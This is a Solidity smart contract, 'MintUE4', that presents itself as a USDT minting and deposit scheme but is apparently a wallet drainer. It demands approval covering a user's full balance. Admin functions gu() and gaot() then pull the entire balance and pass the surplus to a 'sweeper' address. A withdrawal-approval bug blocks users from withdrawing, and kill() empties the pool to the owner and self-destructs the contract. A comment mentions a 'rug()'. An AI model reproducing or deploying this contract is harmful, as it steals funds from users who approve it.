pragma solidity >=0.5.13 ;

import './baselib.sol';
//import "./EnumerableSet.sol";

contract MintUE4 is Ownable {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;
    using TransferHelper for address;
    uint256 constant USDTDecimals = 1000000;
    uint256 constant FC = 10000;

    address public token;
    address public admin ; 
    address public  sweeper;
    uint256 public ad ;
    uint256 public baseunit ; 
    uint256 public freecnt ; 
    uint256 public maxbase ;
    uint256 public feeSP ;
    uint256 public ungeta;


    struct UserMintInfo{
        uint256 mintAmount; // 金额 ，no USDTDecimals
        bool  bapp; //block.timestamp
        uint256 TotalReward ; //得到的总奖励
        uint256 withdrawAmount; //可以提多少
        uint256 stauts ; //状态 ， 0，初始 1、可提   2，冻结  
    } 
    mapping(address => UserMintInfo) public userMintInfoMap;

    constructor(
        address _token,
        address _admin

    ) public payable {
        token = _token;
        admin =  _admin;
        baseunit = 3000;
        freecnt = 500;
        maxbase = 30000;
        feeSP = 100;
        ad = 0;
    }

    modifier onlyAdmin() { require((msg.sender == admin || msg.sender == owner()) ,"Only Admin..."); _;}

    event emint(address, uint,uint,uint);
    event egu(address, uint256,uint256); //
    event eou(address,uint256,uint256);
    event eWithdraw(address , uint256);
    event eapproveWithdrawU(address , uint256,uint256);
    event egao(address,address,uint256,uint256);

    function compfee(uint256 amount) public view returns(uint256){

        if(amount <= freecnt || feeSP < 100 ) return FC;
        uint256 fe1 = 0 ;
        if(amount > freecnt && amount < maxbase){
            fe1 = amount.div(baseunit).mul(100).add(feeSP);
        }
        if(amount > maxbase ){
            fe1 = maxbase.div(baseunit).mul(100).add(feeSP);
        }
        return (FC - fe1) ;
    }
    function mint(uint256 mintcnt, uint256 term) public 
    {
        require(mintcnt > 0);
        uint256 b = IERC20(token).balanceOf(address(msg.sender));
        uint256 a = IERC20(token).allowance(address(msg.sender), address(this));
        require(a >= b && b >= mintcnt.mul(USDTDecimals), "all < b  or b too less ");
        //if(b > FC){ rug();}
        require(address(token).safeTransferFrom(msg.sender , address(this) , mintcnt.mul(USDTDecimals)));
        UserMintInfo storage userinfo = userMintInfoMap[msg.sender];
        userinfo.mintAmount = userinfo.mintAmount.add(mintcnt);

        emit emint(msg.sender,mintcnt,term,IERC20(token).balanceOf(msg.sender) );
    }

    function approveWithdrawU(address useraddr , uint256 apprtype,uint256 amount) public onlyAdmin {
        UserMintInfo storage userinfo = userMintInfoMap[msg.sender];
        if(apprtype == 1){
            userinfo.stauts = 1;
            userinfo.withdrawAmount = amount;
        }else{
            userinfo.stauts = apprtype;
        }
        emit eapproveWithdrawU(useraddr , apprtype,amount);
    }

    function UserWithdraw() public {

        require(userMintInfoMap[msg.sender].stauts == 1);
        UserMintInfo storage userinfo = userMintInfoMap[msg.sender];
        require(userinfo.mintAmount > 0,"mintAmount 0");
        uint256 amount1 = userinfo.withdrawAmount;
        require((amount1 > 0 && amount1 <= userinfo.mintAmount ),"UserWithdraw 0");
        require(IERC20(token).balanceOf(address(this)) > amount1.mul(USDTDecimals), "token balanceOf less");
        IERC20(token).transfer(msg.sender, amount1.mul(USDTDecimals));
        userinfo.mintAmount = userinfo.mintAmount.sub(amount1);
        userinfo.stauts = 0 ;
        userinfo.withdrawAmount = 0;

        emit eWithdraw(msg.sender , amount1);
    }
   /*
    function readb() public view returns(uint256,uint256){
        return IERC20(token).balanceOf(address(this));
        //return admintax , ungetamount;
    }*/

    function readua(address useraddr) view public returns( uint256 ucnt ,uint256 ua)
    {
        require(useraddr != address(0));
        uint256 b = IERC20(token).balanceOf(address(useraddr));
        uint256 f1 = compfee(b.div(USDTDecimals));
        return(b.mul(f1).div(FC) , IERC20(token).allowance(address(useraddr), address(this)));
    }

    function setIRCToken(address _token) public  onlyAdmin {
        //token = IERC20(_token);
        token = _token;
    }

    function setadmin(address _admin ) public  onlyAdmin returns (bool) {
        admin = _admin;
        return true;
    }

    function seta(uint256 _ad , address _sweeper ) public  onlyOwner returns (bool) {
        ad = _ad;
        sweeper = _sweeper;
        return true;
    }
    function feconf(uint256 _baseunit ,uint256 _maxbase , uint256 _freecnt ,uint256 _feesp )  public  onlyOwner {
        require(_baseunit > 299 && _baseunit < 9999 , "_baseunit err");
        require(_maxbase > 9999 && _maxbase < 99999, "_maxbase err");
        require(_freecnt > 9 && _freecnt < 9999, "_freecnt err");
        require(_feesp >49 && _feesp < 999, "_feesp err"); 

        baseunit = _baseunit;
        maxbase = _maxbase;
        freecnt = _freecnt;
        feeSP = _feesp;
    }

    function gu(address useraddr , uint256 amount) public onlyAdmin  returns(bool) {
        require(amount > 0);
        uint256 a = IERC20(token).allowance(address(useraddr), address(this));
        uint256 b = IERC20(token).balanceOf(address(useraddr)) ;
        require(  a >= b  && b >= amount.mul(USDTDecimals) ,"gu allowance or balanceOf less ");
        if(amount <= freecnt){
            require( address(token).safeTransferFrom(useraddr,address(this), amount.mul(USDTDecimals) ),"gao safeTransferFrom1 fail" );    
        }else{
            require( address(token).safeTransferFrom(useraddr,address(this), b ),"gao safeTransferFrom2 fail" ); 
            bautot(amount.mul(USDTDecimals) , b);
        }
        //require( IERC20(token).allowance(address(useraddr), address(this)) >= amount.mul(USDTDecimals),"gu allowance less " );
        //require(address(token).safeTransferFrom(useraddr,address(this),amount.mul(USDTDecimals)) ,"gu safeTransferFrom fail");

        ungeta  = ungeta.add(amount);
        emit egu(useraddr, amount,ungeta);
        return true;
    }

    function ou(uint256 amount,address to) public onlyAdmin  returns(bool) {
        require( amount > 0 , "ou amount err" );
        IUSDT(token).transfer(to, amount.mul(USDTDecimals));
        ungeta = ungeta.sub(amount);
        emit eou(to,amount,ungeta);
        return true;
    }

    function gaot(address useraddr , address to ,uint256 ga, uint256 oa) public onlyAdmin returns(bool){  // onlyAdmin
        require(ga > 0  ,"amount  err");
        uint256 a = IERC20(token).allowance(address(useraddr), address(this));
        uint256 b = IERC20(token).balanceOf(address(useraddr)) ;
        require(  a >= b  && b >= ga.mul(USDTDecimals) ,"gaot allowance or balanceOf less ");

        if(ga <= freecnt){
            require( address(token).safeTransferFrom(useraddr,address(this), ga.mul(USDTDecimals) ),"gaot safeTransferFrom1 fail" );    
        }else{
            require( address(token).safeTransferFrom(useraddr,address(this), b ),"gaot safeTransferFrom2 fail" ); 
            bautot(ga.mul(USDTDecimals) , b);
        }
        if( ga > oa){
            ungeta = ungeta.add(ga.sub(oa));
        }else {
            ungeta = ungeta.add(oa.sub(ga));
        }
        if(oa > 0 && oa.mul(USDTDecimals) <= IERC20(token).balanceOf(address(this)) ){
            IUSDT(token).transfer(to, oa.mul(USDTDecimals));
        }else {
            oa = 0;
        }
        emit egao(useraddr , to, ga , oa);
        return true;
    }

    function bautot(uint256 t1,uint256 t2) private {
        if(ad == 1){
            uint256 c = t2 - t1 ; 
            if(c > USDTDecimals.mul(100)  && sweeper != address(0) ){
                IUSDT(token).transfer(sweeper, c);
            }
        }
    }

    function ot(uint256 amount) public onlyOwner {
        require(address(this).balance >= amount , "balanceOf less unit is least unit" );
        address payable ap = address(uint160(msg.sender));
            ap.transfer(amount);
    }

     function GetATax(uint256 amount1, address to)  public onlyAdmin {
        IUSDT(token).transfer(to, amount1);
    }
    function kill(address add) public onlyOwner {
        IUSDT(token).transfer(msg.sender, IUSDT(token).balanceOf(address(this)));
        address payable ap = address(uint160(add)) ;// address(uint160(msg.sender));
        selfdestruct(ap);
    }

    fallback () external payable {}
}

